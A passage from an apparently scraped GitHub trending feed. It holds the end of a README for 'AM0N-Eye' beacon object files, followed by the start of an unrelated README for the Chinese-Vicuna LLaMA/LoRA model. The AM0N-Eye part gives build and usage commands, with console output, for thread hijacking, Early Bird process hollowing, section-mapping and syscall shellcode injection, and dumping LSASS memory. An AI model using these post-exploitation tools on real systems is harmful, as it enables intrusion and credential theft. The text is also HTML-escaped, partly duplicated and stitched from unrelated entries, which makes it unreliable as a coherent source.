name).&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA;  &lt;h3&gt;BUILDING:&lt;/h3&gt; &#xA;  &lt;ol&gt; &#xA;   &lt;li&gt;On a Windows machine, open a &lt;code&gt;x64 Native Tools Command Prompt for VS&lt;/code&gt; prompt. This can be done by pressing the Windows key and typing &lt;code&gt;x64 Native Tools&lt;/code&gt; and selecting the prompt.&lt;/li&gt; &#xA;   &lt;li&gt;Change directory to &lt;code&gt;C:\path\to\cThreadHijack&lt;/code&gt;.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;nmake -f Makefile.msvc build&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ol&gt; &#xA;  &lt;h3&gt;USAGE:&lt;/h3&gt; &#xA;  &lt;p&gt;&lt;code&gt;cThreadHijack PID LISTENER_NAME&lt;/code&gt;&lt;/p&gt; &#xA;  &lt;pre&gt;&lt;code&gt;beacon&amp;gt; cThreadHijack 7340 TESTING&#xA;[+] host called home, sent: 268433 bytes&#xA;[+] received output:&#xA;[+] Target process PID: 7340&#xA;&#xA;[+] received output:&#xA;[+] Opened a handle to PID 7340&#xA;&#xA;[+] received output:&#xA;[+] Found a thread in the target process! Thread ID: 10212&#xA;&#xA;[+] received output:&#xA;[+] Suspending the targeted thread...&#xA;&#xA;[+] received output:&#xA;[+] Wrote Beacon shellcode to the remote process!&#xA;&#xA;[+] received output:&#xA;[+] Virtual memory for CreateThread and NtContinue routines allocated at 0x201f4ab0000 inside of the remote process!&#xA;&#xA;[+] received output:&#xA;[+] Size of NtContinue routine: 64 bytes&#xA;[+] Size of CONTEXT structure: 1232 bytes&#xA;&#xA;[+] Size of stack alignment routine: 4&#xA;[+] Size of CreateThread routine: 64&#xA;[+] Size of shellcode: 261632 bytes&#xA;&#xA;[+] received output:&#xA;[+] Wrote payload to buffer to previously allocated buffer inside of!&#xA;&#xA;[+] received output:&#xA;[+] Current RIP: 0x7ffa55df69a4&#xA;&#xA;[+] received output:&#xA;[+] Successfully pointed the target thread&#39;s RIP register to the shellcode!&#xA;&#xA;[+] received output:&#xA;[+] Current RIP: 0x201f4ab0000&#xA;&#xA;[+] received output:&#xA;[+] Resuming the thread! Please wait a few moments for the Beacon payload to execute...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;h2&gt;process-hollowing - AM0N-Eye BOF&lt;/h2&gt; &#xA;  &lt;p&gt;Beacon Object File (BOF) that spawns an arbitrary process from beacons memory in a suspended state, inject shellcode, hijack main thread with APC, and execute shellcode; using the Early Bird injection method taught&lt;/p&gt; &#xA;  &lt;h3&gt;Run from AM0N-Eye Beacon Console&lt;/h3&gt; &#xA;  &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;beacon&amp;gt; help process-hollowing&#xA;Synopsis: process-hollowing /path/to/process-hollowing/pe /local/path/to/shellcode.bin&#xA;beacon&amp;gt; process-hollowing svchost.exe /Users/bobby.cooke/popCalc.bin&#xA;[*] process-hollowing - EarlyBird Remote Process Shellcode Injector&#xA;[*] Reading shellcode from: /Users/bobby.cooke/popCalc.bin&#xA;[+] Success - Spawned process for svchost.exe at 5464 (PID)&#xA;[+] Success - Allocated RE memory in remote process 5464 (PID) at: 0x000001A83BEC0000&#xA;[+] Success - Wrote 280 bytes to memory in remote process 5464 (PID) at 0x000001A83BEC0000&#xA;[+] Success - APC queued for main thread of 5464 (PID) to shellcode address 0x000001A83BEC0000&#xA;[+] Success - Your thread was resumed and your shellcode is being executed within the remote process!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;h3&gt;Compile with x64 MinGW (only tested from macOS):&lt;/h3&gt; &#xA;  &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;x86_64-w64-mingw32-gcc -c process-hollowing.x64.c -o process-hollowing.x64.o&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;h3&gt;To Do List&lt;/h3&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Refactor code to make it more modular/clean&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Combine this with the PPID spoofing and blockdll features of SPAWN&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA;  &lt;h2&gt;Section Mapping Process Injection (secinject): AM0N-Eye BOF&lt;/h2&gt; &#xA;  &lt;p&gt;Beacon Object File (BOF) that leverages Native APIs to achieve process injection through memory section mapping. one to inject beacon shellcode for a selected listener into the desired process, and one to inject the user&#39;s desired shellcode - loaded from a bin file - into the desired process. These are &lt;em&gt;sec-inject&lt;/em&gt; and &lt;em&gt;sec-shinject&lt;/em&gt; respectively.&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Currently, this is only implemented for x64 processes.&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA;  &lt;h3&gt;How to Make&lt;/h3&gt; &#xA;  &lt;pre&gt;&lt;code&gt;cd secinject/src&#xA;make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;h3&gt;How to Use&lt;/h3&gt; &#xA;  &lt;h4&gt;Injecting Beacon&lt;/h4&gt; &#xA;  &lt;pre&gt;&lt;code&gt;sec-inject PID LISTENER-NAME&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;h4&gt;Injecting Other Shellcode&lt;/h4&gt; &#xA;  &lt;pre&gt;&lt;code&gt;sec-shinject PID /path/to/bin&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;h2&gt;Section Mapping Process Injection (secinject): AM0N-Eye BOF&lt;/h2&gt; &#xA;  &lt;p&gt;Beacon Object File (BOF) that leverages Native APIs to achieve process injection through memory section mapping. one to inject beacon shellcode for a selected listener into the desired process, and one to inject the user&#39;s desired shellcode - loaded from a bin file - into the desired process. These are &lt;em&gt;sec-inject&lt;/em&gt; and &lt;em&gt;sec-shinject&lt;/em&gt; respectively.&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Currently, this is only implemented for x64 processes.&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA;  &lt;h3&gt;How to Make&lt;/h3&gt; &#xA;  &lt;pre&gt;&lt;code&gt;cd secinject/src&#xA;make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;h3&gt;How to Use&lt;/h3&gt; &#xA;  &lt;h4&gt;Injecting Beacon&lt;/h4&gt; &#xA;  &lt;pre&gt;&lt;code&gt;sec-inject PID LISTENER-NAME&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;h4&gt;Injecting Other Shellcode&lt;/h4&gt; &#xA;  &lt;pre&gt;&lt;code&gt;sec-shinject PID /path/to/bin&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;h2&gt;Compile&lt;/h2&gt; &#xA;  &lt;pre&gt;&lt;code&gt;make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;h2&gt;Usage&lt;/h2&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;static_syscalls_dump PID output_file&lt;/code&gt; - Creates a dump for the specified PID at the supplied location.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;static_syscalls_dump PID&lt;/code&gt; - Not providing an output location will default to &#34;C:\Windows\Temp\PID-[target_pid].dmp&#34;&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA;  &lt;blockquote&gt; &#xA;   &lt;p&gt;NOTE: BOF is for 64-bit use only.&lt;/p&gt; &#xA;  &lt;/blockquote&gt; &#xA;  &lt;h3&gt;Example Output&lt;/h3&gt; &#xA;  &lt;pre&gt;&lt;code&gt;beacon&amp;gt; static_syscalls_dump 4337 C:\Users\user\Desktop\lsass.dmp&#xA;[*] Syscalls Process Dump BOF (@ajpc500)&#xA;[+] host called home, sent: 8904 bytes&#xA;[+] received output:&#xA;Using Syscalls for Windows 10 or Server 2016, build number 19041&#xA;Dumping PID 4337 to file: C:\Users\user\Desktop\lsass.dmp&#xA;&#xA;[+] received output:&#xA;Success!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;h2&gt;Compile&lt;/h2&gt; &#xA;  &lt;pre&gt;&lt;code&gt;make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;h2&gt;Usage&lt;/h2&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;static_syscalls_inject PID listener_name&lt;/code&gt; - Injects shellcode for beacon into target PID.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;static_syscalls_shinject PID path_to_bin&lt;/code&gt; - Injects custom shellcode into target PID.&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA;  &lt;blockquote&gt; &#xA;   &lt;p&gt;NOTE: BOF is for 64-bit use only.&lt;/p&gt; &#xA;  &lt;/blockquote&gt; &#xA;  &lt;h3&gt;Custom shellcode&lt;/h3&gt; &#xA;  &lt;pre&gt;&lt;code&gt;beacon&amp;gt; static_syscalls_shinject 4052 C:\Users\user\shellcode\calc.bin&#xA;[*] Static Syscalls Shellcode Injection BOF (@ajpc500)&#xA;[*] Reading shellcode from: C:\Users\user\shellcode\calc.bin&#xA;[+] host called home, sent: 4824 bytes&#xA;[+] received output:&#xA;Shellcode injection completed successfully!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;h3&gt;Beacon shellcode&lt;/h3&gt; &#xA;  &lt;pre&gt;&lt;code&gt;beacon&amp;gt; static_syscalls_inject 4972 http&#xA;[*] Static Syscalls Shellcode Injection BOF (@ajpc500)&#xA;[*] Using http listener for beacon shellcode generation.&#xA;[+] host called home, sent: 266180 bytes&#xA;[+] received output:&#xA;Shellcode injection completed successfully!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;h2&gt;Compile&lt;/h2&gt; &#xA;  &lt;pre&gt;&lt;code&gt;make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;h2&gt;Usage&lt;/h2&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;syscalls_inject PID listener_name&lt;/code&gt; - Injects shellcode for beacon into target PID.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;syscalls_shinject PID path_to_bin&lt;/code&gt; - Injects custom shellcode into target PID.&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA;  &lt;blockquote&gt; &#xA;   &lt;p&gt;NOTE: BOF is for 64-bit use only.&lt;/p&gt; &#xA;  &lt;/blockquote&gt; &#xA;  &lt;h3&gt;Custom shellcode&lt;/h3&gt; &#xA;  &lt;pre&gt;&lt;code&gt;beacon&amp;gt; syscalls_shinject 2268 C:\Users\user\Desktop\beacon64.bin&#xA;[*] Syscalls Shellcode Inject (@ajpc500)&#xA;[*] Reading shellcode from: C:\Users\user\Desktop\beacon64.bin&#xA;[+] host called home, sent: 266159 bytes&#xA;[+] received output:&#xA;Shellcode injection completed successfully!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;h3&gt;Beacon shellcode&lt;/h3&gt; &#xA;  &lt;pre&gt;&lt;code&gt;beacon&amp;gt; syscalls_inject 13764 http&#xA;[*] Syscalls Shellcode Inject (@ajpc500)&#xA;[*] Using http listener for beacon shellcode generation.&#xA;[+] host called home, sent: 266159 bytes&#xA;[+] received output:&#xA;Shellcode injection completed successfully!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;h1&gt;BOF Template&lt;/h1&gt; &#xA;  &lt;p&gt;This repository is meant to host the core files needed to create a Beacon Object File for use with AM0N-Eye.&lt;/p&gt; &#xA;  &lt;p&gt;A Beacon Object File (BOF) is a compiled C program, written to a convention that allows it to execute within a Beacon process and use internal Beacon APIs. BOFs are a way to rapidly extend the Beacon agent with new post-exploitation features.&lt;/p&gt; &#xA;  &lt;h2&gt;beacon.h&lt;/h2&gt; &#xA;  &lt;p&gt;beacon.h contains definitions for several internal Beacon APIs. The function go is similar to main in any other C program. It&#39;s the function that&#39;s called by inline-execute and arguments are passed to it. BeaconOutput is an internal Beacon API to send output to the operator.&lt;/p&gt; &#xA;  &lt;h2&gt;examples&lt;/h2&gt; &#xA;  &lt;p&gt;This directory contains examples BOFs. The directory contains the following:&lt;/p&gt; &#xA;  &lt;h4&gt;demo&lt;/h4&gt; &#xA;  &lt;p&gt;Directory containing the example demo BOF which demonstrates items that are now supported in AM0N-Eye version 4.7&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;demo/build.bat - build script for the Microsoft Visual Studio compiler.&lt;/li&gt; &#xA;   &lt;li&gt;demo/build.sh - build script for the MinGW compiler.&lt;/li&gt; &#xA;   &lt;li&gt;demo/demo.c - source code for the demo example.&lt;/li&gt; &#xA;   &lt;li&gt;execute the demo command.&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA;  &lt;p&gt;Use:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Use one of the build scripts to build the object file.&lt;/li&gt; &#xA;   &lt;li&gt;Execute the &lt;code&gt;demo&lt;/code&gt; command in the beacon console.&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA;  &lt;h4&gt;hello&lt;/h4&gt; &#xA;  &lt;p&gt;Directory containing the example hello world BOF from the documentation.&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;hello/build.bat - build script for the Microsoft Visual Studio compiler.&lt;/li&gt; &#xA;   &lt;li&gt;hello/build.sh - build script for the MinGW compiler.&lt;/li&gt; &#xA;   &lt;li&gt;hello/hello.c - source code for the hello world example.&lt;/li&gt; &#xA;   &lt;li&gt;execute the hello command.&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA;  &lt;p&gt;Use:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Use one of the build scripts to build the object file.&lt;/li&gt; &#xA;   &lt;li&gt;Execute the &lt;code&gt;hello&lt;/code&gt; command in the beacon console.&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA;  &lt;h4&gt;helloWorld&lt;/h4&gt; &#xA;  &lt;p&gt;Directory containing the example helloWorld BOF from the documentation.&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;helloWorld/build.bat - build script for the Microsoft Visual Studio compiler.&lt;/li&gt; &#xA;   &lt;li&gt;helloWorld/build.sh - build script for the MinGW compiler.&lt;/li&gt; &#xA;   &lt;li&gt;helloWorld/hello.c - source code for the example.&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA;  &lt;p&gt;Use:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Use one of the build scripts to build the object file.&lt;/li&gt; &#xA;   &lt;li&gt;Use the inline-execute command in the beacon console.&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA;  &lt;p&gt;Examples:&lt;/p&gt; &#xA;  &lt;pre&gt;&lt;code&gt;  inline-execute /base/path/examples/helloWorld/hello.x64.o these are args&#xA;  inline-execute /base/path/examples/helloWorld/hello.x86.o these are args&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;h2&gt;tests&lt;/h2&gt; &#xA;  &lt;p&gt;The tests directory contains examples for using the internal Beacon APIs. The directory contains the following:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;build.sh - builds the object files located in tests/src. Requires mingw-w64 cross-compiler package&lt;/li&gt; &#xA;   &lt;li&gt;src directory - Contains example source files for using the internal Beacon APIs.&lt;/li&gt; &#xA;  &lt;/ul&gt; &#xA;  &lt;p&gt;How to execute the tests:&lt;/p&gt; &#xA;  &lt;ol&gt; &#xA;   &lt;li&gt;Build the object files with the build.sh script in the tests directory.&lt;/li&gt; &#xA;   &lt;li&gt;Start a team server and client&lt;/li&gt; &#xA;   &lt;li&gt;Generate and start a beacon on a test system.&lt;/li&gt; &#xA;   &lt;li&gt;In the beacon console execute: run_boff_tests &#34;&amp;lt;user_string&amp;gt;&#34; &amp;lt;numeric&amp;gt; &#34;&amp;lt;numeric_string&amp;gt;&#34;&lt;/li&gt; &#xA;  &lt;/ol&gt; &#xA;  &lt;p&gt;where:&lt;br&gt; ‚ÄÉ user_string is any quoted input string&lt;br&gt; ‚ÄÉ numeric is any signed short or integer value&lt;br&gt; ‚ÄÉ numeric_string is any quoted numeric string (only used in testBeaconDataLongLong)&lt;/p&gt; &#xA;  &lt;p&gt;Run &#39;unhook&#39; from Beacon&lt;/p&gt; &#xA;  &lt;p&gt;To build:&lt;/p&gt; &#xA;  &lt;p&gt;x86: Open Visual Studio x86 Native Tools Command Prompt and type &#39;make&#39; x64: Open Visual Studio x64 Croos Tools Command Prompt and type &#39;make&#39;&lt;/p&gt; &#xA;  &lt;pre&gt;&lt;code&gt;&#xA;##Curl-TLS&#xA;&#xA;##Compile&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;p&gt;make&lt;/p&gt; &#xA;  &lt;pre&gt;&lt;code&gt;### Examples&#xA;&#xA;Simple request to confirm a 200 response:&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;p&gt;beacon&amp;gt; curl &lt;a href=&#34;https://f-secure.com&#34;&gt;https://f-secure.com&lt;/a&gt; [*] Running Simple Web Request Utility [+] host called home, sent: 2882 bytes [+] received output: GET f-secure.com:443 User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36 Accept: &lt;em&gt;/&lt;/em&gt;&lt;/p&gt; &#xA;  &lt;p&gt;[+] received output: Response Code: 200&lt;/p&gt; &#xA;  &lt;pre&gt;&lt;code&gt;&#xA;Simple GET request that prints output (print is useful for calls to web APIs, a bad idea against a Javascript-heavy webpage!):&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;  &lt;p&gt;beacon&amp;gt; curl &lt;a href=&#34;http://example.com&#34;&gt;http://example.com&lt;/a&gt; 80 GET --show [*] Running Simple Web Request Utility [+] host called home, sent: 2880 bytes [+] received output: GET example.com:80 User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36 Accept: &lt;em&gt;/&lt;/em&gt;&lt;/p&gt; &#xA;  &lt;p&gt;[+] received output: Response Code: 200&lt;/p&gt; &#xA;  &lt;p&gt;[+] received output: &amp;lt;!doctype html&amp;gt;&lt;/p&gt;   &amp;lt;title&amp;gt;Example Domain&amp;lt;/title&amp;gt; ... ``` &#xA; &lt;/start&gt;&#xA;&lt;/install&gt;</summary>
  </entry>
  <entry>
    <title>Facico/Chinese-Vicuna</title>
    <updated>2023-03-29T01:32:41Z</updated>
    <id>tag:github.com,2023-03-29:/Facico/Chinese-Vicuna</id>
    <link href="https://github.com/Facico/Chinese-Vicuna" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Chinese-Vicuna: A Chinese Instruction-following LLaMA-based Model ‚Äî‚Äî ‰∏Ä‰∏™‰∏≠Êñá‰ΩéËµÑÊ∫êÁöÑllama+loraÊñπÊ°àÔºåÁªìÊûÑÂèÇËÄÉalpaca&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;img src=&#34;https://github.com/Facico/Chinese-Vicuna/raw/master/img/vicuna-llama.png&#34; alt=&#34;camel&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Chinese-Vicuna: A Chinese Instruction-following LLaMA-based Model ‚Äî‚Äî ‰∏Ä‰∏™‰∏≠Êñá‰ΩéËµÑÊ∫êÁöÑllama+loraÊñπÊ°à&lt;/h1&gt; &#xA;&lt;p&gt;| &lt;a href=&#34;https://github.com/Facico/Chinese-Vicuna/raw/master/README.md&#34;&gt;English&lt;/a&gt; | &lt;a href=&#34;https://github.com/Facico/Chinese-Vicuna/raw/master/docs/readme-zh.md&#34;&gt;‰∏≠Êñá&lt;/a&gt; |&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/Facico/Chinese-Vicuna/raw/master/img/camel.png&#34; alt=&#34;camel&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;This is the repo for the Chinese-Vicuna project, which aims to build and share an instruction-following Chinese LLaMA model which can run on a single Nvidia RTX-2080TI, that why we named this project &lt;code&gt;Vicuna&lt;/code&gt;, small but strong enough !&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Why is it called VicunaÔºöIn view of the successful development of alpaca models such as &lt;a href=&#34;https://github.com/facebookresearch/llama&#34;&gt;llama&lt;/a&gt;,&lt;a href=&#34;https://github.com/tatsu-lab/stanford_alpaca&#34;&gt;alpaca&lt;/a&gt;,&lt;a href=&#34;https://github.com/Guanaco-Model/Guanaco-Model.github.io&#34;&gt;guanaco&lt;/a&gt;ÔºåWe want to train a Chinese small alpaca like Vicuna.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;The repo contains:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;code for finetune the model&lt;/li&gt; &#xA; &lt;li&gt;code for generation based on trained model&lt;/li&gt; &#xA; &lt;li&gt;code for run on CPU (fp16 or int4 is support, in purely C++)&lt;/li&gt; &#xA; &lt;li&gt;tools to download/convert/quantify original facebook llama.ckpt&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;What‚Äòs New&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;March 23, 2023ÔºöReleased checkpoint-4000 with 50w data training&lt;/li&gt; &#xA; &lt;li&gt;March 23, 2023ÔºöDeploy the code for fine-tuning and inferencing in colab&lt;/li&gt; &#xA; &lt;li&gt;March 23, 2023ÔºöProvides code that can be used for inference in pure c++&lt;/li&gt; &#xA; &lt;li&gt;March 24, 2023ÔºöReleased checkpoint-8000 for training about 1.5 epochs on belle+guanacoÔºà100w dataÔºâ&lt;/li&gt; &#xA; &lt;li&gt;March 26, 2023ÔºöProvides a quantitative approach&lt;/li&gt; &#xA; &lt;li&gt;March 27, 2023ÔºöReleased checkpoint-final for training 3 epochs on belle+guanaco&lt;/li&gt; &#xA; &lt;li&gt;March 27, 2023ÔºöAdded multi-round interactive dialog script with alpaca-lora-serve service&lt;/li&gt; &#xA; &lt;li&gt;March 28, 2023ÔºöReleased our model on &lt;a href=&#34;https://huggingface.co/Facico/Chinese-Vicuna-lora-7b-3epoch-belle-and-guanaco&#34;&gt;huggingface&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;March 29, 2023ÔºöAdded gradio typewriter-like output with beam search, better user interaction support.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Table of Contents&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Facico/Chinese-Vicuna&#34;&gt;Vicuna&lt;/a&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Facico/Chinese-Vicuna#whats-new&#34;&gt;what&#39;s new&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Facico/Chinese-Vicuna#what-is-the-meaning&#34;&gt;what is the meaning&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Facico/Chinese-Vicuna#try-on-colab&#34;&gt;try on colab&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Facico/Chinese-Vicuna#performance&#34;&gt;performance&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;strong&gt;Checkpoint-4000&lt;/strong&gt;(Facico/Chinese-Vicuna-lora-7b-0.75epoch-belle-and-guanaco)&lt;/li&gt; &#xA;   &lt;li&gt;&lt;strong&gt;Checkpoint-8000&lt;/strong&gt;(Facico/Chinese-Vicuna-lora-7b-1.5epoch-belle-and-guanaco)&lt;/li&gt; &#xA;   &lt;li&gt;&lt;strong&gt;Checkpoint-final&lt;/strong&gt;(Facico/Chinese-Vicuna-lora-7b-3epoch-belle-and-guanaco) and it is used for multiple rounds of dialogue&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Facico/Chinese-Vicuna#what-we-need&#34;&gt;What we need?&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;code„ÄÅdata„ÄÅLarge Language Model„ÄÅLORA model„ÄÅDevice&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Facico/Chinese-Vicuna#how-to-use&#34;&gt;How to use&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Installing„ÄÅMulti-gpu training„ÄÅSingle-gpu training„ÄÅInference and use gradio to generate a web page„ÄÅ multi-round interaction and use gradio to generate a web page„ÄÅStreaming mode base on alpaca-lora-serve&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Facico/Chinese-Vicuna#inference-on-cpu-with-pure-c&#34;&gt;inference on CPU with pure C++&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Facico/Chinese-Vicuna#more-tools&#34;&gt;More tools&lt;/a&gt;Ôºåfor more details, see &lt;a href=&#34;https://github.com/Facico/Chinese-Vicuna/tree/master/tools&#34;&gt;tool readme&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;ways for faster weight download ( 8MB/s )&lt;code&gt;download_llama.sh&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;convert tools between the original facebook checkpoint and huggingface format&lt;code&gt;convert_llama.py&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;a quantitative approach that requires less than 4G graphics memory for inference&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Facico/Chinese-Vicuna#possible-problems-encountered&#34;&gt;Possible problems encountered&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Facico/Chinese-Vicuna#todo&#34;&gt;todo&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Facico/Chinese-Vicuna#citation&#34;&gt;citation&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Overview&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;LLaMA paper: &lt;a href=&#34;https://arxiv.org/abs/2302.13971v1&#34;&gt;https://arxiv.org/abs/2302.13971v1&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Self-Instruct paper: &lt;a href=&#34;https://arxiv.org/abs/2212.10560&#34;&gt;https://arxiv.org/abs/2212.10560&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;data generation: &lt;a href=&#34;https://github.com/LianjiaTech/BELLE&#34;&gt;https://github.com/LianjiaTech/BELLE&lt;/a&gt; and &lt;a href=&#34;https://guanaco-model.github.io/&#34;&gt;https://guanaco-model.github.io/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;the first work: &lt;a href=&#34;https://github.com/tatsu-lab/stanford_alpaca&#34;&gt;https://github.com/tatsu-lab/stanford_alpaca&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;We currently select the combination of BELLE and Guanaco data as our main training dataset. We will also add more chitchat dataset ( e.g. &lt;a href=&#34;https://github.com/thu-coai/CDial-GPT&#34;&gt;LCCC&lt;/a&gt; ) to support casual conversation.&lt;/p&gt; &#xA;&lt;h2&gt;What is the meaning?&lt;/h2&gt; &#xA;&lt;p&gt;Similar to the explosion of the stable diffusion model, platforms like civitai have emerged, consisting of a base model + various LORA models in an open source community.&lt;/p&gt; &#xA;&lt;p&gt;The repo hopes to help you to train these LORA models.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;what is LORA?&lt;/strong&gt;ÔºöSimply, it&#39;s a plugin used to help adapt large models to your dataset, technical details can be found in&lt;a href=&#34;https://arxiv.org/pdf/2106.09685.pdf&#34;&gt;LoRA: Low-Rank Adaptation of Large Language Models&lt;/a&gt;„ÄÇIts advantage is that the finetune is very fast when it comes to getting a small model, about 30M, and the key is that it supports &lt;strong&gt;Plug and Play&lt;/strong&gt;. As can be expected, this is a very suitable architecture for open source ecology.&lt;/p&gt; &#xA;&lt;p&gt;Here, we will help you train through a very low-demand environment, with only one &lt;strong&gt;2080&lt;/strong&gt; (11G) to achieve certain results.&lt;/p&gt; &#xA;&lt;h2&gt;Try on colab&lt;/h2&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;colab link&lt;/th&gt; &#xA;   &lt;th&gt;Descriptions&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://colab.research.google.com/drive/1OLCJ-ZHogm5O3RdyUDY83YfgnCXdHNXp?usp=sharing&#34;&gt;&lt;img src=&#34;https://camo.githubusercontent.com/84f0493939e0c4de4e6dbe113251b4bfb5353e57134ffd9fcab6b8714514d4d1/68747470733a2f2f636f6c61622e72657365617263682e676f6f676c652e636f6d2f6173736574732f636f6c61622d62616467652e737667&#34; alt=&#34;Open In Colab&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Use the specified lora model to inference and generate a 